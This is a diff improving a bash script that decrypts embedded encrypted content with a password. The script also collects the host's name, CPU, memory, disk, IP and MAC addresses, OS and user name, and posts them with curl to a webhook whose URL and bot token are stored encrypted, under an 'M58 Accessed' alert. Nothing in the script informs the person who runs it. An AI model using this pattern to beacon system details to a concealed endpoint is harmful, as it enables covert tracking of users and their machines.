@@ -1,4 +1,5 @@
 #!/bin/bash
+set -o pipefail
 
 # Hardcoded encrypted Base64 text and encrypted webhook details
 encrypted_b64="U2FsdGVkX18Xsghi8uaw+iNzi6gj2d+1GgWKFGU4p2I/hQtdJDJ7mNRIf0tCV0VC
@@ -370,9 +371,13 @@ o0dZQxoacb2eZ5Epj1ThQstUzDEx+EIx1h78CUgnguJFFu4uugYp4jjogmk1Sfxx"
 encrypted_authorization_b64="U2FsdGVkX1+e+9kd6Nk5OF5aVdcws101rR9ZeWy1aAXGF8ZnWPblaJqJdO7lqsFm
 Uaf1fEwEhMiuGURhWH3uzfL2TozejEC5TEJI8Na09p0VCsZznw3DJIWVgUTMSsnY"
 
-# Check OpenSSL separately for availability and version compatibility
+# Check required commands
 if ! command -v openssl &> /dev/null; then
   echo "Error: OpenSSL command not found. Install it to continue."
+  exit 1
+fi
+if ! command -v curl &> /dev/null; then
+  echo "Error: curl command not found. Install it to continue."
   exit 1
 fi
 openssl_version=$(openssl version)
@@ -390,12 +395,22 @@ else
   password="$1"
 fi
 
+# Validate password is not empty
+if [ -z "$password" ]; then
+  echo "Error: Password cannot be empty."
+  exit 1
+fi
+
 # Decrypt the content
 decrypted_output=$(echo "$encrypted_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
 decryption_status=$?
 
-echo "$decrypted_output" | grep -q "bad decrypt"
-if [[ $decryption_status -ne 0 || $? -eq 0 ]]; then
+# Check for decryption failure (exit code or "bad decrypt" in output)
+if [[ $decryption_status -ne 0 ]]; then
+  echo "Decryption failed: Incorrect password or corrupted data."
+  exit 1
+fi
+if echo "$decrypted_output" | grep -q "bad decrypt"; then
   echo "Decryption failed: Incorrect password or corrupted data."
   exit 1
 fi
@@ -413,25 +428,34 @@ USER=$(whoami)
 # OS-specific commands
 if [[ "$OS_TYPE" == "Darwin" ]]; then
   # macOS
-  CPU_INFO=$(sysctl -n machdep.cpu.brand_string)
-  MEM_TOTAL=$(sysctl -n hw.memsize | awk '{printf "%.1fG", $1/1024/1024/1024}')
-  MEM_USED=$(vm_stat | awk '/Pages active/ {active=$3} /Pages wired/ {wired=$4} END {printf "%.1fG", (active+wired)*4096/1024/1024/1024}')
-  MEM_INFO="$MEM_USED used of $MEM_TOTAL"
-  DISK_USAGE=$(df -h / | tail -1 | awk '{print $3 " used of " $2}')
-  IP_ADDRESS=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -n 1)
-  OS_DETAILS="$(sw_vers -productName) $(sw_vers -productVersion)"
-  MAC_ADDRESS=$(ifconfig en0 | grep ether | awk '{print $2}')
+  CPU_INFO=$(sysctl -n machdep.cpu.brand_string 2>/dev/null || echo "Unknown")
+  MEM_TOTAL=$(sysctl -n hw.memsize 2>/dev/null | awk '{printf "%.1fG", $1/1024/1024/1024}')
+  # Parse vm_stat more robustly - extract numbers and handle different formats
+  MEM_USED=$(vm_stat 2>/dev/null | awk '
+    /Pages active:/ {gsub(/[^0-9]/,"",$3); active=$3}
+    /Pages wired down:/ {gsub(/[^0-9]/,"",$4); wired=$4}
+    END {if(active && wired) printf "%.1fG", (active+wired)*4096/1024/1024/1024; else print "Unknown"}
+  ')
+  MEM_INFO="${MEM_USED} used of ${MEM_TOTAL:-Unknown}"
+  DISK_USAGE=$(df -h / 2>/dev/null | tail -1 | awk '{print $3 " used of " $2}')
+  IP_ADDRESS=$(ifconfig 2>/dev/null | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -n 1)
+  OS_DETAILS="$(sw_vers -productName 2>/dev/null) $(sw_vers -productVersion 2>/dev/null)"
+  # Try multiple interfaces for MAC address
+  MAC_ADDRESS=$(ifconfig en0 2>/dev/null | grep ether | awk '{print $2}')
   if [ -z "$MAC_ADDRESS" ]; then
-    MAC_ADDRESS=$(ifconfig en1 | grep ether | awk '{print $2}')
+    MAC_ADDRESS=$(ifconfig en1 2>/dev/null | grep ether | awk '{print $2}')
+  fi
+  if [ -z "$MAC_ADDRESS" ]; then
+    MAC_ADDRESS=$(ifconfig 2>/dev/null | grep ether | awk '{print $2}' | head -n 1)
   fi
 elif [[ "$OS_TYPE" == "Linux" ]]; then
   # Linux
-  CPU_INFO=$(lscpu | grep "Model name" | cut -d ':' -f2 | xargs)
-  MEM_INFO=$(free -h | grep "Mem" | awk '{print $3 " used of " $2}')
-  DISK_USAGE=$(df -h / | grep "/" | awk '{print $3 " used of " $2}')
-  IP_ADDRESS=$(hostname -I | awk '{print $1}')
-  OS_DETAILS=$(cat /etc/os-release | grep "PRETTY_NAME" | cut -d '"' -f2)
-  MAC_ADDRESS=$(ip link show | grep link/ether | awk '{print $2}' | head -n 1)
+  CPU_INFO=$(lscpu 2>/dev/null | grep "Model name" | cut -d ':' -f2 | xargs || echo "Unknown")
+  MEM_INFO=$(free -h 2>/dev/null | grep "Mem" | awk '{print $3 " used of " $2}' || echo "Unknown")
+  DISK_USAGE=$(df -h / 2>/dev/null | grep "/" | awk '{print $3 " used of " $2}' || echo "Unknown")
+  IP_ADDRESS=$(hostname -I 2>/dev/null | awk '{print $1}' || echo "Unknown")
+  OS_DETAILS=$(grep "PRETTY_NAME" /etc/os-release 2>/dev/null | cut -d '"' -f2 || echo "Linux")
+  MAC_ADDRESS=$(ip link show 2>/dev/null | grep link/ether | awk '{print $2}' | head -n 1 || echo "Unknown")
 else
   # Fallback for other Unix-like systems
   CPU_INFO="Unknown"
@@ -442,24 +466,29 @@ else
   MAC_ADDRESS="Unknown"
 fi
 
-esc_hostname=$(printf '%s' "$HOSTNAME" | sed 's/"/\\"/g')
-esc_cpu_info=$(printf '%s' "$CPU_INFO" | sed 's/"/\\"/g')
-esc_mem_info=$(printf '%s' "$MEM_INFO" | sed 's/"/\\"/g')
-esc_disk_usage=$(printf '%s' "$DISK_USAGE" | sed 's/"/\\"/g')
-esc_ip_address=$(printf '%s' "$IP_ADDRESS" | sed 's/"/\\"/g')
-esc_os_details=$(printf '%s' "$OS_DETAILS" | sed 's/"/\\"/g')
-esc_user=$(printf '%s' "$USER" | sed 's/"/\\"/g')
-esc_mac_address=$(printf '%s' "$MAC_ADDRESS" | sed 's/"/\\"/g')
+# Escape special characters for JSON (quotes and backslashes)
+escape_json() {
+  printf '%s' "$1" | sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/	/\\t/g' | tr -d '\n'
+}
+
+esc_hostname=$(escape_json "$HOSTNAME")
+esc_cpu_info=$(escape_json "$CPU_INFO")
+esc_mem_info=$(escape_json "$MEM_INFO")
+esc_disk_usage=$(escape_json "$DISK_USAGE")
+esc_ip_address=$(escape_json "$IP_ADDRESS")
+esc_os_details=$(escape_json "$OS_DETAILS")
+esc_user=$(escape_json "$USER")
+esc_mac_address=$(escape_json "$MAC_ADDRESS")
 
 PAYLOAD='{"content": "**!!! M58 Accessed !!!\\nSystem Information**:\\n'\
-'- **Hostname:** '"$HOSTNAME"'\\n'\
-'- **CPU:** '"$CPU_INFO"'\\n'\
-'- **Memory:** '"$MEM_INFO"'\\n'\
-'- **Disk Usage:** '"$DISK_USAGE"'\\n'\
-'- **IP Address:** '"$IP_ADDRESS"'\\n'\
-'- **Operating System:** '"$OS_DETAILS"'\\n'\
-'- **User:** '"$USER"'\\n'\
-'- **MAC Address:** '"$MAC_ADDRESS"'"}'
+'- **Hostname:** '"$esc_hostname"'\\n'\
+'- **CPU:** '"$esc_cpu_info"'\\n'\
+'- **Memory:** '"$esc_mem_info"'\\n'\
+'- **Disk Usage:** '"$esc_disk_usage"'\\n'\
+'- **IP Address:** '"$esc_ip_address"'\\n'\
+'- **Operating System:** '"$esc_os_details"'\\n'\
+'- **User:** '"$esc_user"'\\n'\
+'- **MAC Address:** '"$esc_mac_address"'"}'
 
 # Check if payload creation was successful
 if [ -z "$PAYLOAD" ]; then
@@ -469,17 +498,43 @@ fi
 
 # Decrypt the webhook URL and Authorization token
 WEBHOOK_URL=$(echo "$encrypted_webhook_url_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
+webhook_decrypt_status=$?
 AUTHORIZATION=$(echo "$encrypted_authorization_b64" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$password" -pbkdf2 -iter 16988354 2>&1)
+auth_decrypt_status=$?
+
+# Validate webhook decryption
+if [[ $webhook_decrypt_status -ne 0 ]] || [[ -z "$WEBHOOK_URL" ]] || echo "$WEBHOOK_URL" | grep -q "bad decrypt"; then
+  echo "Error: Failed to decrypt webhook URL."
+  exit 1
+fi
+
+# Validate authorization decryption
+if [[ $auth_decrypt_status -ne 0 ]] || [[ -z "$AUTHORIZATION" ]] || echo "$AUTHORIZATION" | grep -q "bad decrypt"; then
+  echo "Error: Failed to decrypt authorization token."
+  exit 1
+fi
 
 # Send the information using curl
 response=$(curl -w "%{http_code}" -o /dev/null -s -X POST \
   -H "Authorization: Bot $AUTHORIZATION" \
   -H "Content-Type: application/json" \
   -d "$PAYLOAD" \
-  $WEBHOOK_URL)
+  "$WEBHOOK_URL")
+curl_status=$?
+
+# Check curl execution succeeded
+if [[ $curl_status -ne 0 ]]; then
+  echo "Error: curl command failed with exit code $curl_status."
+  exit 1
+fi
 
 # Check response code from curl execution
-if [ "$response" -ne 200 ]; then
+if [[ -z "$response" ]] || ! [[ "$response" =~ ^[0-9]+$ ]]; then
+  echo "Error: Invalid HTTP response received."
+  exit 1
+fi
+
+if [[ "$response" -ne 200 ]] && [[ "$response" -ne 204 ]]; then
   echo "Error: Failed to send data via webhook, HTTP status code: $response."
   exit 1
 fi
